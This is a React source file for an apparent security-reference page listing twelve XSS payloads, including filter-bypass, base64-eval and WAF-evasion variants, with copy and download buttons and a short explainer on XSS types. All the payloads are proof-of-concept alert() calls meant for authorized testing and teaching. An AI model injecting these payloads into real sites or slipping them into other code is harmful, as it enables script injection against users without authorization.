
import { useState } from "react";
import { Copy, ExternalLink, Search, File, Download, Check } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import CodeBlock from "@/components/CodeBlock";
import { motion } from "framer-motion";

interface XSSPayload {
  id: string;
  name: string;
  code: string;
  description: string;
  category: string;
  tags: string[];
  reference?: string;
}

// Extended XSS payloads from the repository
const xssPayloads: XSSPayload[] = [
  {
    id: "basic-alert",
    name: "Basic Alert",
    code: "<script>alert('XSS')</script>",
    description: "A simple JavaScript alert payload that demonstrates basic XSS vulnerability",
    category: "Basic",
    tags: ["JavaScript", "Alert", "Basic"]
  },
  {
    id: "img-onerror",
    name: "Image onerror",
    code: "<img src=x onerror=alert('XSS')>",
    description: "Using the image onerror event handler to execute JavaScript when the image fails to load",
    category: "HTML Attributes",
    tags: ["JavaScript", "Image", "Event Handler"]
  },
  {
    id: "svg-onload",
    name: "SVG onload",
    code: "<svg onload=alert('XSS')>",
    description: "SVG element with an onload event that executes JavaScript when the SVG is loaded",
    category: "HTML Attributes",
    tags: ["JavaScript", "SVG", "Event Handler"]
  },
  {
    id: "javascript-uri",
    name: "JavaScript URI",
    code: "<a href=\"javascript:alert('XSS')\">Click me</a>",
    description: "A link that executes JavaScript when clicked via the javascript: protocol",
    category: "URI",
    tags: ["JavaScript", "URI", "Link"]
  },
  {
    id: "dom-insertion",
    name: "DOM Insertion",
    code: "<div id=\"demo\"></div>\n<script>document.getElementById(\"demo\").innerHTML = \"<img src=x onerror=alert('XSS')>\";</script>",
    description: "Inserts malicious code into the DOM after page load using innerHTML",
    category: "DOM",
    tags: ["JavaScript", "DOM", "innerHTML"]
  },
  {
    id: "eval-payload",
    name: "Eval Payload",
    code: "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
    description: "Using eval() with base64 encoded payload to bypass filters",
    category: "Evasion",
    tags: ["JavaScript", "Encoding", "Eval", "Base64"]
  },
  {
    id: "css-expression",
    name: "CSS Expression",
    code: "<div style=\"background-image:url(javascript:alert('XSS'))\"></div>",
    description: "Using CSS expressions to execute JavaScript code via style attribute",
    category: "CSS",
    tags: ["JavaScript", "CSS", "Style"]
  },
  {
    id: "meta-refresh",
    name: "Meta Refresh",
    code: "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
    description: "Using meta refresh to execute JavaScript code when the page loads",
    category: "Meta Tags",
    tags: ["JavaScript", "Meta", "Refresh"]
  },
  {
    id: "polyglot-xss",
    name: "XSS Polyglot",
    code: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>",
    description: "A complex XSS payload designed to bypass multiple filters at once",
    category: "Evasion",
    tags: ["JavaScript", "Polyglot", "Filter Bypass", "Advanced"]
  },
  {
    id: "iframe-srcdoc",
    name: "iframe srcdoc",
    code: "<iframe srcdoc=\"<script>alert('XSS');</script>\">",
    description: "Using iframe's srcdoc attribute to execute JavaScript in a sandboxed context",
    category: "HTML Attributes",
    tags: ["JavaScript", "iframe", "srcdoc"]
  },
  {
    id: "data-uri-script",
    name: "Data URI Script",
    code: "<script src=\"data:text/javascript,alert('XSS')\"></script>",
    description: "Using data URI scheme to execute JavaScript via script src attribute",
    category: "URI",
    tags: ["JavaScript", "Data URI", "Script"]
  },
  {
    id: "waf-bypass",
    name: "WAF Bypass",
    code: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
    description: "Using HTML entity encoding to bypass Web Application Firewalls",
    category: "Evasion",
    tags: ["JavaScript", "WAF Bypass", "HTML Entities"]
  }
];

const categories = ["All", "Basic", "HTML Attributes", "URI", "DOM", "Evasion", "CSS", "Meta Tags"];

const XSS = () => {
  const [searchQuery, setSearchQuery] = useState("");
  const [activeCategory, setActiveCategory] = useState("All");
  const [copying, setCopying] = useState<string | null>(null);
  const [downloading, setDownloading] = useState<string | null>(null);
  const { toast } = useToast();
  
  const filteredPayloads = xssPayloads.filter(payload => {
    const matchesSearch = 
      payload.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
      payload.description.toLowerCase().includes(searchQuery.toLowerCase()) ||
      payload.tags.some(tag => tag.toLowerCase().includes(searchQuery.toLowerCase()));
    
    const matchesCategory = activeCategory === "All" || payload.category === activeCategory;
    
    return matchesSearch && matchesCategory;
  });
  
  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopying(id);
    toast({
      title: "Copied to clipboard",
      description: "XSS payload has been copied to clipboard",
      duration: 1500,
    });
    
    setTimeout(() => {
      setCopying(null);
    }, 1500);
  };
  
  const downloadPayload = (text: string, name: string, id: string) => {
    setDownloading(id);
    
    try {
      // Create a blob with the payload content
      const blob = new Blob([text], { type: 'text/plain' });
      const url = URL.createObjectURL(blob);
      
      // Create a temporary anchor element to trigger download
      const link = document.createElement('a');
      link.href = url;
      link.download = `${name.toLowerCase().replace(/\s+/g, '-')}.txt`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      
      URL.revokeObjectURL(url);
      toast({ description: "XSS payload downloaded successfully" });
    } catch (error) {
      console.error('Download failed:', error);
      toast({ 
        title: "Download failed",
        description: "Could not download the payload file", 
        variant: "destructive" 
      });
    } finally {
      setTimeout(() => {
        setDownloading(null);
      }, 1000);
    }
  };

  return (
    <div className="container py-8 animate-fade-in">
      <div className="mb-8">
        <h1 className="text-3xl font-bold mb-2">XSS Payloads</h1>
        <p className="text-muted-foreground">
          Cross-Site Scripting (XSS) payloads for security testing and demonstration purposes. These payloads exploit vulnerabilities that allow attackers to inject client-side scripts into web pages viewed by other users.
        </p>
      </div>
      
      <div className="mb-8">
        <div className="flex flex-col sm:flex-row gap-4">
          <div className="relative w-full sm:max-w-sm">
            <Search className="absolute left-3 top-2.5 h-4 w-4 text-muted-foreground pointer-events-none" />
            <Input 
              placeholder="Search XSS payloads..." 
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="pl-9"
            />
          </div>
          
          <div className="overflow-auto pb-2">
            <Tabs 
              defaultValue="All" 
              value={activeCategory} 
              onValueChange={setActiveCategory}
              className="w-full"
            >
              <TabsList className="inline-flex h-9 w-auto">
                {categories.map(category => (
                  <TabsTrigger 
                    key={category} 
                    value={category}
                    className="data-[state=active]:animate-pulse transition-all"
                  >
                    {category}
                  </TabsTrigger>
                ))}
              </TabsList>
            </Tabs>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {filteredPayloads.map((payload, index) => (
          <motion.div
            key={payload.id}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.3, delay: index * 0.1 }}
          >
            <Card 
              className="overflow-hidden transition-all duration-300 hover:-translate-y-1 hover:shadow-md h-full flex flex-col"
            >
              <CardHeader className="pb-2">
                <div className="flex justify-between">
                  <div className="flex items-center gap-2">
                    <File className="h-4 w-4 text-muted-foreground" />
                    <CardTitle className="text-lg">{payload.name}</CardTitle>
                  </div>
                  <Badge variant="outline">{payload.category}</Badge>
                </div>
                <CardDescription>{payload.description}</CardDescription>
              </CardHeader>
              <CardContent className="flex-grow pb-2">
                <div className="relative">
                  <CodeBlock 
                    code={payload.code} 
                    language="html"
                    showLineNumbers
                    title="XSS Payload"
                    className="max-h-40"
                  />
                </div>
                <div className="flex flex-wrap gap-1 mt-3">
                  {payload.tags.map(tag => (
                    <Badge key={tag} variant="secondary" className="text-xs">
                      {tag}
                    </Badge>
                  ))}
                </div>
              </CardContent>
              <CardFooter className="flex justify-between gap-2 pt-2">
                <Button 
                  variant="outline" 
                  size="sm" 
                  className="gap-1 flex-1"
                  onClick={() => downloadPayload(payload.code, payload.name, payload.id)}
                  disabled={downloading === payload.id}
                >
                  {downloading === payload.id ? (
                    <>Downloading...</>
                  ) : (
                    <>
                      <Download className="h-4 w-4" /> Download
                    </>
                  )}
                </Button>
                <Button 
                  variant="outline" 
                  size="sm" 
                  className="gap-1 flex-1"
                  onClick={() => copyToClipboard(payload.code, payload.id)}
                >
                  {copying === payload.id ? (
                    <>
                      <Check className="h-4 w-4" /> Copied
                    </>
                  ) : (
                    <>
                      <Copy className="h-4 w-4" /> Copy
                    </>
                  )}
                </Button>
              </CardFooter>
            </Card>
          </motion.div>
        ))}
        
        {filteredPayloads.length === 0 && (
          <div className="col-span-full text-center py-12">
            <p className="text-muted-foreground">No XSS payloads match your search criteria</p>
            <Button 
              variant="ghost" 
              onClick={() => {
                setSearchQuery("");
                setActiveCategory("All");
              }}
              className="mt-4"
            >
              Clear filters
            </Button>
          </div>
        )}
      </div>
      
      <div className="mt-12 bg-secondary/20 p-6 rounded-lg">
        <h2 className="text-xl font-bold mb-3">About XSS Vulnerabilities</h2>
        <p className="mb-4">
          Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into
          web pages that are viewed by other users. These scripts can access cookies, session tokens, or other sensitive 
          information retained by the browser, and can rewrite the content of the HTML page.
        </p>
        <h3 className="text-lg font-semibold mb-2">Types of XSS</h3>
        <ul className="list-disc pl-5 space-y-2 mb-4">
          <li>
            <span className="font-medium">Reflected XSS:</span> The malicious script is reflected off the web server, such as in an error message or search result.
          </li>
          <li>
            <span className="font-medium">Stored XSS:</span> The malicious script is stored on the target server, such as in a database, message forum, or comment field.
          </li>
          <li>
            <span className="font-medium">DOM-based XSS:</span> The vulnerability exists in client-side code rather than server-side code.
          </li>
        </ul>
        <div className="bg-black/10 p-4 rounded-md">
          <p className="text-sm text-muted-foreground">
            <strong>Disclaimer:</strong> These payloads are provided for educational purposes and security testing only. Always obtain proper authorization before testing XSS vulnerabilities on any system.
          </p>
        </div>
      </div>
    </div>
  );
};

export default XSS;
